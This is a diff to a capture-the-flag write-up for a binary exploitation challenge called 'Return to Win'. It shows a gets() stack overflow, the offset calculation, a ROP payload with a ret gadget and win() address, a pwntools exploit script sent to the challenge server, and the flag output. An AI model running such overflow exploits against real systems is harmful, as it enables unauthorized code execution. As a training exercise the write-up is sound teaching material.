@@ -1,9 +1,31 @@
+---
+layout: default
+title: Return to Win
+parent: ByteMe CTF
+category: pwn
+---
+
+# Return to Win
+
+## Category Binary Exploitation
+
+## Challenge Description
+
+Classic stack buffer overflow with unbounded gets() into a 10-byte buffer.
+
+nc 145.239.142.129 1340
+
+**File Attachments :**
+[main.out](main.out)
+
+## Exploit
+
 I opened the file with Ghidra and find out this :
 
-The hello() function uses gets(local_12), which is dangerously unsafe:
+The `hello()` function uses `gets(local_12)`, which is dangerously unsafe:
 
-- local_12 is a 10-byte buffer (char[10]).
-- gets() does not check input size → if you send >10 bytes, it overwrites adjacent memory on the stack.
+- `local_12` is a 10-byte buffer (`char[10]`).
+- `gets()` does not check input size → if you send >10 bytes, it overwrites adjacent memory on the stack.
 - This is a classic stack-based buffer overflow.
 
 When hello() is called, the stack looks like this (growing downward):
@@ -22,7 +44,7 @@ To overwrite the return address, we need: 10 (buffer) + 8 (RBP) = 18 bytes of pa
 Our payload must:
 - Fill the buffer + RBP: 18 bytes of junk (e.g., 'A').
 - Overwrite return address: ret gadget (0x40125d) in little-endian.
-- Next address: win() (0x401262) in little-endian.
+- Next address: `win()` (0x401262) in little-endian.
 
 | Part               | Value (Hex)       | Little-Endian Bytes          | Size  |
 |--------------------|-------------------|------------------------------|-------|
@@ -42,28 +64,25 @@ Final Payload (Hex):
 
 Now we just have to send it to the server using python because copy paste will not work here :
 ```py
-import socket
+from pwn import *
 
 HOST, PORT = "145.239.142.129", 1340
 
-payload = (
-    b"A" * 18 +
-    bytes.fromhex("5d12400000000000") +
-    bytes.fromhex("6212400000000000")
-)
+payload = b"A" * 18 + p64(0x40125d) + p64(0x401262)
 
-with socket.socket() as s:
-    s.connect((HOST, PORT))
-    s.sendall(payload + b"\n")
+io = remote(HOST, PORT)
+io.sendline(payload)
 
-    response = b""
-    while True:
-        data = s.recv(4096)
-        if not data:
-            break
-        response += data
-
-    print(response.decode(errors="ignore"))
+response = io.recvall()
+print(response.decode(errors="ignore"))
 ```
 
-And the return is : OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
+Here is the output :
+```
+[+] Opening connection to 145.239.142.129 on port 1340: Done
+[+] Receiving all data: Done (87B)
+[*] Closed connection to 145.239.142.129 port 1340
+Hi, what's your name?
+Hello, AAAAAAAAAAAAAAAAAA]\x12@!
+OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
+```
